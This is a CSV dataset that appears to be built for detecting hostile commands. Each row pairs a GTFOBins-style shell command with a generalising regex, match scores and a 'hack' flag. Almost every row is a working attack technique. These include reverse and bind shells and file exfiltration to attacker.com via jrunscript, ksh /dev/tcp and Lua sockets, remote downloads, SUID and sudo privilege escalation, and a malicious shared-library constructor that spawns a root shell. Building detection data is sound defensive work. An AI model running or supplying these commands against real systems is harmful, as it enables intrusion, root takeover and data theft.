ocode,code,word_count,match_count,match_score,hack
"jrunscript -e ""exec('/bin/sh -c /$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')""","jrunscript -c [\'|""]| -e [\'|""]|cat >.*<<.*exec\('/bin/sh -c /\$@\|sh _ echo sh <\$\(tty\) >\$\(tty\) 2>\$\(tty\)'\)""",11,1,0.5324675324675324,1
export RHOST=attacker.com,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",2,2,1.1923076923076923,0
export RPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
"jrunscript -e 'var host='""'""""$RHOST""""'""'; var port='""$RPORT""';var p=new java.lang.ProcessBuilder(""/bin/bash"", ""-i"").redirectErrorStream(true).start();var s=new java.net.Socket(host,port);var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();java.lang.Thread.sleep(50);try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'","jrunscript -c [\'|""]| -e [\'|""]|cat >.*<<.*var [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\$RHOST""""'""'\; var [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\$RPORT""'\;var [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.lang\.ProcessBuilder\(""/bin/bash""\, ""-i""\)\.redirectErrorStream\(true\)\.start\(\)\;var [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.net\.Socket\(host\,port\)\;var [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.getInputStream\(\)\,[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.getErrorStream\(\)\,[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.getInputStream\(\)\;var [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.getOutputStream\(\)\,[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.getOutputStream\(\)\;while\(!s\.isClosed\(\)\){while\(pi\.available\(\)>0\)so\.write\(pi\.read\(\)\)\;while\(pe\.available\(\)>0\)so\.write\(pe\.read\(\)\)\;while\(si\.available\(\)>0\)po\.write\(si\.read\(\)\)\;so\.flush\(\)\;po\.flush\(\)\;java\.lang\.Thread\.sleep\(50\)\;try {p\.exitValue\(\)\;break\;}catch \(e\){}}\;p\.destroy\(\)\;s\.close\(\)\;'",15,19,0.7311072056239016,1
URL=http://attacker.com/file_to_get,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+://attacker\.com/[\w\-_\/]+",1,3,1.1944444444444444,0
LFILE=file_to_save,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"jrunscript -e ""cp('$URL','$LFILE')""","jrunscript -c [\'|""]| -e [\'|""]|cat >.*<<.*cp\('\$URL'\,'\$LFILE'\)""",3,1,0.9166666666666666,0
"jrunscript -e 'var fw=new java.io.FileWriter(""./file_to_write""); fw.write(""DATA""); fw.close();'","jrunscript -c [\'|""]| -e [\'|""]|cat >.*<<.*var [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.io\.FileWriter\(""\./[\w\-_\/]+""\)\; fw\.write\(""DATA""\)\; fw\.close\(\)\;'",7,4,0.875,0
"jrunscript -e 'br = new BufferedReader(new java.io.FileReader(""file_to_read"")); while ((line = br.readLine()) != null) { print(line); }'","jrunscript -c [\'|""]| -e [\'|""]|cat >.*<<.*br =[ a-z0-9\.\-\/\'\""_\@]+BufferedReader\(new java\.io\.FileReader\(""[\w\-_\/]+""\)\)\; while \(\(line =[ a-z0-9\.\-\/\'\""_\@]+\.readLine\(\)\) !=[ a-z0-9\.\-\/\'\""_\@]+\) { print\(line\)\; }'",16,5,0.8905109489051095,0
sudo install -m =xs $(which jrunscript) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which jrunscript\) \.",7,1,0.6428571428571429,0
"./jrunscript -e ""exec('/bin/sh -pc /$@|sh/${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')""","\./jrunscript -c [\'|""]| -e [\'|""]|cat >.*<<.*exec\('/bin/sh -pc /\$@\|sh/\${IFS}-p _ echo sh -p <\$\(tty\) >\$\(tty\) 2>\$\(tty\)'\)""",12,1,0.4673913043478261,1
"sudo jrunscript -e ""exec('/bin/sh -c /$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')""","sudo jrunscript -c [\'|""]| -e [\'|""]|cat >.*<<.*exec\('/bin/sh -c /\$@\|sh _ echo sh <\$\(tty\) >\$\(tty\) 2>\$\(tty\)'\)""",12,1,0.5,1
ksh,ksh,1,0,0.0,0
export RHOST=attacker.com,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",2,2,1.1923076923076923,0
export RPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
ksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1',"ksh -c [\'|""]| -e [\'|""]|cat >.*<<.*ksh -i > /dev/tcp/\$RHOST/\$RPORT 2>&1 0>&1'",8,1,0.5882352941176471,0
export RHOST=attacker.com,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",2,2,1.1923076923076923,0
export RPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
export LFILE=file_to_send,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1538461538461537,0
"ksh -c 'echo -e ""POST / HTTP/0.9/n/n$(cat $LFILE)"" > /dev/tcp/$RHOST/$RPORT'","ksh -c [\'|""]| -e [\'|""]|cat >.*<<.*echo -c [\'|""]| -e [\'|""]|cat >.*<<.*POST / HTTP/0\.9/n/n\$\(cat \$LFILE\)"" > /dev/tcp/\$RHOST/\$RPORT'",10,2,0.8181818181818182,0
export RHOST=attacker.com,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",2,2,1.1923076923076923,0
export RPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
export LFILE=file_to_send,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1538461538461537,0
ksh -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT',"ksh -c [\'|""]| -e [\'|""]|cat >.*<<.*cat \$LFILE > /dev/tcp/\$RHOST/\$RPORT'",6,1,0.6888888888888889,0
export RHOST=attacker.com,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",2,2,1.1923076923076923,0
export RPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
export LFILE=file_to_get,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.2,0
"ksh -c '{ echo -ne ""GET /$LFILE HTTP/1.0/r/nhost: $RHOST/r/n/r/n"" 1>&3; cat 0<&3; } /    3<>/dev/tcp/$RHOST/$RPORT /    | { while read -r; do [ ""$REPLY"" = ""$(echo -ne ""/r"")"" ] && break; done; cat; } > $LFILE'","ksh -c [\'|""]| -e [\'|""]|cat >.*<<.*{ echo -ne ""GET /\$LFILE HTTP/1\.0/r/nhost: \$RHOST/r/n/r/n"" 1>&3\; cat 0<&3\; } /    3<>/dev/tcp/\$RHOST/\$RPORT /    \| { while read -r\; do  ""\$REPLY"" =[ a-z0-9\.\-\/\'\""_\@]+\$\(echo -ne ""/r""\)""  && break\; done\; cat\; } > \$LFILE'",42,2,0.3188405797101449,0
export RHOST=attacker.com,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",2,2,1.1923076923076923,0
export RPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
export LFILE=file_to_get,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.2,0
ksh -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE',"ksh -c [\'|""]| -e [\'|""]|cat >.*<<.*cat < /dev/tcp/\$RHOST/\$RPORT > \$LFILE'",7,1,0.6595744680851063,0
export LFILE=file_to_write,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1481481481481481,0
ksh -c 'echo DATA > $LFILE',"ksh -c [\'|""]| -e [\'|""]|cat >.*<<.*echo DATA > \$LFILE'",6,1,1.0357142857142858,0
export LFILE=file_to_read,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1538461538461537,0
"ksh -c 'echo ""$(<$LFILE)""'","ksh -c [\'|""]| -e [\'|""]|cat >.*<<.*echo ""\$\(<\$LFILE\)""'",4,1,1.1851851851851851,0
export LFILE=file_to_read,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1538461538461537,0
"ksh -c $'read -r -d /x04 < ""$LFILE""; echo ""$REPLY""'","ksh -c \$'read -r -d /x04 < ""\$LFILE""\; echo ""\$REPLY""'",10,0,0.07692307692307693,0
sudo install -m =xs $(which ksh) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which ksh\) \.",7,1,0.7714285714285715,0
./ksh -p,\./ksh -p,2,0,0.1111111111111111,0
sudo ksh,sudo ksh,2,0,0.0,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
ksshell -i $LFILE,ksshell -i \$LFILE,3,0,0.05555555555555555,0
sudo install -m =xs $(which ksshell) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which ksshell\) \.",7,1,0.6923076923076923,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
./ksshell -i $LFILE,\./ksshell -i \$LFILE,3,0,0.1,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
sudo ksshell -i $LFILE,sudo ksshell -i \$LFILE,4,0,0.043478260869565216,0
$ strings /proc/self/exe | head -1,\$ strings /proc/self/exe \| head -1,6,0,0.05714285714285714,0
/lib64/ld-linux-x86-64.so.2,/lib64/ld-linux-x86-64\.so\.2,1,0,0.07142857142857142,0
/lib/ld.so /bin/sh,/lib/ld\.so /bin/sh,2,0,0.05263157894736842,1
sudo install -m =xs $(which ld.so) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which ld\.so\) \.",7,1,0.7567567567567568,0
./ld.so /bin/sh -p,\./ld\.so /bin/sh -p,3,0,0.10526315789473684,1
sudo /lib/ld.so /bin/sh,sudo /lib/ld\.so /bin/sh,3,0,0.041666666666666664,1
$ ldd /bin/ping | grep libcap,\$ ldd /bin/ping \| grep libcap,6,0,0.06666666666666667,1
      libcap.so.2 => /tmp/tmp.9qfoUyKaGu/libcap.so.2 (0x00007fc7e9797000),libcap\.so\.2 => /tmp/tmp\.9qfoUyKaGu/libcap\.so\.2 \(0x00007fc7e9797000\),10,0,0.17567567567567569,0
echo '#include <unistd.h>,echo '#include <unistd\.h>,3,0,0.038461538461538464,0
__attribute__((constructor)),__attribute__\(\(constructor\)\),1,0,0.13793103448275862,0
static void init() {,static void init\(\) {,4,0,0.09523809523809523,0
"    execl(""/bin/sh"", ""/bin/sh"", ""-p"", NULL);","execl\(""/bin/sh""\, ""/bin/sh""\, ""-p""\, NULL\)\;",8,0,0.2222222222222222,1
},},1,0,0.0,0
"' >""$TF/lib.c""","' >""\$TF/lib\.c""",2,0,0.13333333333333333,0
"gcc -fPIC -shared ""$TF/lib.c"" -o ""$TF/libcap.so.2""","gcc -fPIC -shared ""\$TF/lib\.c"" -o ""\$TF/libcap\.so\.2""",6,0,0.09803921568627451,0
$ ping,\$ ping,2,0,0.14285714285714285,0
# id,# id,2,0,0.0,0
uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user),"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(user\) [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(user\) e[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(root\) [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(user\)",4,8,2.098360655737705,0
TF=$(mktemp -d),[\w\-_]+=\$\(mktemp -d\),2,1,0.6875,0
"echo ""$TF"" > ""$TF/conf""","echo ""\$TF"" > ""\$TF/conf""",4,0,0.08333333333333333,0
# move malicious libraries in $TF,# move malicious libraries in \$TF,6,0,0.029411764705882353,0
"sudo ldconfig -f ""$TF/conf""","sudo ldconfig -f ""\$TF/conf""",4,0,0.03571428571428571,0
sudo install -m =xs $(which ldconfig) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which ldconfig\) \.",7,1,0.675,0
TF=$(mktemp -d),[\w\-_]+=\$\(mktemp -d\),2,1,0.6875,0
"echo ""$TF"" > ""$TF/conf""","echo ""\$TF"" > ""\$TF/conf""",4,0,0.08333333333333333,0
# move malicious libraries in $TF,# move malicious libraries in \$TF,6,0,0.029411764705882353,0
"./ldconfig -f ""$TF/conf""","\./ldconfig -f ""\$TF/conf""",3,0,0.08,0
less /etc/profile,less /etc/profile,2,0,0.0,0
!/bin/sh,!/bin/sh,1,0,0.0,1
"VISUAL=""/bin/sh -c '/bin/sh'"" less /etc/profilev","[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+[\'|""]| -e [\'|""]|cat >.*<<.*/bin/sh'"" less /etc/profilev",5,3,1.1224489795918366,1
echo DATA | less,echo DATA \| less,4,0,0.058823529411764705,0
sfile_to_write,s[\w\-_\/]+,1,1,0.8,0
q,q,1,0,0.0,0
less file_to_write,less [\w\-_\/]+,2,1,0.631578947368421,0
v,v,1,0,0.0,0
less file_to_read,less [\w\-_\/]+,2,1,0.6111111111111112,0
less /etc/profile,less /etc/profile,2,0,0.0,0
:e file_to_read,:e [\w\-_\/]+,2,1,0.6875,0
sudo install -m =xs $(which less) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which less\) \.",7,1,0.75,0
./less file_to_read,\./less [\w\-_\/]+,2,1,0.6,0
sudo less /etc/profile,sudo less /etc/profile,3,0,0.0,0
!/bin/sh,!/bin/sh,1,0,0.0,1
logsave /dev/null /bin/sh -i,logsave /dev/null /bin/sh -i,4,0,0.0,1
sudo install -m =xs $(which logsave) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which logsave\) \.",7,1,0.6923076923076923,0
./logsave /dev/null /bin/sh -i -p,\./logsave /dev/null /bin/sh -i -p,5,0,0.029411764705882353,1
sudo logsave /dev/null /bin/sh -i,sudo logsave /dev/null /bin/sh -i,5,0,0.0,1
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"look '' ""$LFILE""","look '' ""\$LFILE""",3,0,0.058823529411764705,0
sudo install -m =xs $(which look) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which look\) \.",7,1,0.75,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"./look '' ""$LFILE""","\./look '' ""\$LFILE""",3,0,0.10526315789473684,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"sudo look '' ""$LFILE""","sudo look '' ""\$LFILE""",4,0,0.045454545454545456,0
ltrace -b -L /bin/sh,ltrace -b -L /bin/sh,4,0,0.0,1
sudo ltrace -b -L /bin/sh,sudo ltrace -b -L /bin/sh,5,0,0.0,1
"lua -e 'os.execute(""/bin/sh"")'","lua -c [\'|""]| -e [\'|""]|cat >.*<<.*os\.execute\(""/bin/sh""\)'",3,1,1.0,1
export RHOST=attacker.com,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",2,2,1.1923076923076923,0
export RPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
"lua -e 'local s=require(""socket"");  local t=assert(s.tcp());  t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));  while true do    local r,x=t:receive();local f=assert(io.popen(r,""r""));    local b=assert(f:read(""*a""));t:send(b);  end;  f:close();t:close();'","lua -c [\'|""]| -e [\'|""]|cat >.*<<.*local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(""socket""\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(s\.tcp\(\)\)\;  t:connect\(os\.getenv\(""RHOST""\)\,os\.getenv\(""RPORT""\)\)\;  while true do    local r\,[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+:receive\(\)\;local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(io\.popen\(r\,""r""\)\)\;    local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(f:read\(""\*a""\)\)\;t:send\(b\)\;  end\;  f:close\(\)\;t:close\(\)\;'",28,11,0.8793774319066148,0
export LPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
"lua -e 'local k=require(""socket"");  local s=assert(k.bind(""*"",os.getenv(""LPORT"")));  local c=s:accept();  while true do    local r,x=c:receive();local f=assert(io.popen(r,""r""));    local b=assert(f:read(""*a""));c:send(b);  end;c:close();f:close();'","lua -c [\'|""]| -e [\'|""]|cat >.*<<.*local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(""socket""\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(k\.bind\(""\*""\,os\.getenv\(""LPORT""\)\)\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+:accept\(\)\;  while true do    local r\,[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+:receive\(\)\;local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(io\.popen\(r\,""r""\)\)\;    local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(f:read\(""\*a""\)\)\;c:send\(b\)\;  end\;c:close\(\)\;f:close\(\)\;'",27,13,1.028225806451613,0
RHOST=attacker.com,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",1,2,1.631578947368421,0
RPORT=12345,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.5833333333333335,0
LFILE=file_to_send,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"lua -e '  local f=io.open(os.getenv(""LFILE""), 'rb')  local d=f:read(""*a"")  io.close(f);  local s=require(""socket"");  local t=assert(s.tcp());  t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));  t:send(d);  t:close();'","lua -c [\'|""]| -e [\'|""]|cat >.*<<.*  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.open\(os\.getenv\(""LFILE""\)\, 'rb'\)  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+:read\(""\*a""\)  io\.close\(f\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(""socket""\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(s\.tcp\(\)\)\;  t:connect\(os\.getenv\(""RHOST""\)\,os\.getenv\(""RPORT""\)\)\;  t:send\(d\)\;  t:close\(\)\;'",24,9,0.8715596330275229,0
export LPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
export LFILE=file_to_save,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1538461538461537,0
"lua -e 'local k=require(""socket"");  local s=assert(k.bind(""*"",os.getenv(""LPORT"")));  local c=s:accept();  local d,x=c:receive(""*a"");  c:close();  local f=io.open(os.getenv(""LFILE""), ""wb"");  f:write(d);  io.close(f);'","lua -c [\'|""]| -e [\'|""]|cat >.*<<.*local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(""socket""\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(k\.bind\(""\*""\,os\.getenv\(""LPORT""\)\)\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+:accept\(\)\;  local d\,[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+:receive\(""\*a""\)\;  c:close\(\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.open\(os\.getenv\(""LFILE""\)\, ""wb""\)\;  f:write\(d\)\;  io\.close\(f\)\;'",23,11,1.023041474654378,0
"lua -e 'local f=io.open(""file_to_write"", ""wb""); f:write(""DATA""); io.close(f);'","lua -c [\'|""]| -e [\'|""]|cat >.*<<.*local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.open\(""[\w\-_\/]+""\, ""wb""\)\; f:write\(""DATA""\)\; io\.close\(f\)\;'",7,4,1.0506329113924051,0
"lua -e 'local f=io.open(""file_to_read"", ""rb""); print(f:read(""*a"")); io.close(f);'","lua -c [\'|""]| -e [\'|""]|cat >.*<<.*local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.open\(""[\w\-_\/]+""\, ""rb""\)\; print\(f:read\(""\*a""\)\)\; io\.close\(f\)\;'",7,4,1.0365853658536586,0
sudo install -m =xs $(which lua) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which lua\) \.",7,1,0.7714285714285715,0
"lua -e 'local f=io.open(""file_to_read"", ""rb""); print(f:read(""*a"")); io.close(f);'","lua -c [\'|""]| -e [\'|""]|cat >.*<<.*local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.open\(""[\w\-_\/]+""\, ""rb""\)\; print\(f:read\(""\*a""\)\)\; io\.close\(f\)\;'",7,4,1.0365853658536586,0
"sudo lua -e 'os.execute(""/bin/sh"")'","sudo lua -c [\'|""]| -e [\'|""]|cat >.*<<.*os\.execute\(""/bin/sh""\)'",4,1,0.8611111111111112,1
sudo install -m =xs $(which lua) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which lua\) \.",7,1,0.7714285714285715,0
"./lua -e 'os.execute(""/bin/sh"")'","\./lua -c [\'|""]| -e [\'|""]|cat >.*<<.*os\.execute\(""/bin/sh""\)'",3,1,0.9696969696969697,1
URL=http://attacker.com/file_to_get,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+://attacker\.com/[\w\-_\/]+",1,3,1.1944444444444444,0
LFILE=file_to_save,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
lwp-download $URL $LFILE,lwp-download \$URL \$LFILE,3,0,0.08,0
sudo install -m =xs $(which lwp-download) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which lwp-download\) \.",7,1,0.6136363636363636,0
URL=http://attacker.com/file_to_get,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+://attacker\.com/[\w\-_\/]+",1,3,1.1944444444444444,0
LFILE=file_to_save,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
./lwp-download $URL $LFILE,\./lwp-download \$URL \$LFILE,3,0,0.1111111111111111,0
URL=http://attacker.com/file_to_get,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+://attacker\.com/[\w\-_\/]+",1,3,1.1944444444444444,0
LFILE=file_to_save,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
sudo lwp-download $URL $LFILE,sudo lwp-download \$URL \$LFILE,4,0,0.06666666666666667,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"lwp-request ""file://$LFILE""","lwp-request ""file://\$LFILE""",2,0,0.03571428571428571,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"sudo lwp-request ""file://$LFILE""","sudo lwp-request ""file://\$LFILE""",3,0,0.030303030303030304,0
sudo install -m =xs $(which lwp-request) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which lwp-request\) \.",7,1,0.627906976744186,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"./lwp-request ""file://$LFILE""","\./lwp-request ""file://\$LFILE""",2,0,0.06666666666666667,0
mail --exec='!/bin/sh',"mail [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+!/bin/sh'",2,2,1.2608695652173914,1
TF=$(mktemp),[\w\-_]+=\$\(mktemp\),1,1,0.8461538461538461,0
"echo ""From nobody@localhost $(date)"" > $TF","echo ""From nobody@localhost \$\(date\)"" > \$TF",6,0,0.09302325581395349,0
mail -f $TF,mail -f \$TF,3,0,0.08333333333333333,0
!/bin/sh,!/bin/sh,1,0,0.0,1
sudo mail --exec='!/bin/sh',"sudo mail [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+!/bin/sh'",3,2,1.0357142857142858,1
COMMAND='/bin/sh',"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.6666666666666667,0
"make -s --eval=$'x:/n/t-'""$COMMAND""","make -s [\w\-_]+=\$'x:/n/t-'""\$COMMAND""",3,1,0.2777777777777778,0
LFILE=file_to_write,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.55,0
"make -s --eval=""/$(file >$LFILE,DATA)"" .","make -s [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\$\(file >\$LFILE\,DATA\)"" \.",5,2,0.8536585365853658,0
sudo install -m =xs $(which make) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which make\) \.",7,1,0.75,0
COMMAND='/bin/sh -p',"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.380952380952381,0
"./make -s --eval=$'x:/n/t-'""$COMMAND""","\./make -s [\w\-_]+=\$'x:/n/t-'""\$COMMAND""",3,1,0.2894736842105263,0
COMMAND='/bin/sh',"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.6666666666666667,0
"sudo make -s --eval=$'x:/n/t-'""$COMMAND""","sudo make -s [\w\-_]+=\$'x:/n/t-'""\$COMMAND""",4,1,0.24390243902439024,0
man man,man man,2,0,0.0,0
!/bin/sh,!/bin/sh,1,0,0.0,1
man file_to_read,man [\w\-_\/]+,2,1,0.6470588235294118,0
sudo man man,sudo man man,3,0,0.0,0
!/bin/sh,!/bin/sh,1,0,0.0,1
"mawk 'BEGIN {system(""/bin/sh"")}'","mawk 'BEGIN {system\(""/bin/sh""\)}'",3,0,0.06060606060606061,1
LFILE=file_to_write,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.55,0
"mawk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'","mawk -v [\w\-_]+=\$LFILE 'BEGIN { print ""DATA"" > LFILE }'",10,1,0.16666666666666666,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"mawk '//' ""$LFILE""","mawk '//' ""\$LFILE""",3,0,0.05263157894736842,0
sudo install -m =xs $(which mawk) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which mawk\) \.",7,1,0.75,0
